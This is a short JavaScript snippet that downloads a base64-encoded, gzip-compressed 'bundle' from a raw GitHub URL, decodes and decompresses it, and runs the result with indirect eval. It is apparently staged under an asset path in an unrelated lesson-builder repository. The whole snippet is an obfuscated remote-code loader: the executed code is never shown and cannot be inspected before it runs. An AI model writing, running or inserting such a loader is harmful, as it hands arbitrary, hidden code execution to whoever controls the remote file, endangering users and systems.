const url = "https://raw.githubusercontent.com/rrs77/eyfslessonbuilder/main/artifacts/ccd/public/the-facts/assets/the-facts-bundle.b64";
const b64 = (await (await fetch(url)).text()).replace(/\s+/g, "");
const bin = Uint8Array.from(atob(b64), (c) => c.charCodeAt(0));
const stream = new Blob([bin]).stream().pipeThrough(new DecompressionStream("gzip"));
const text = await new Response(stream).text();
(0, eval)(text);
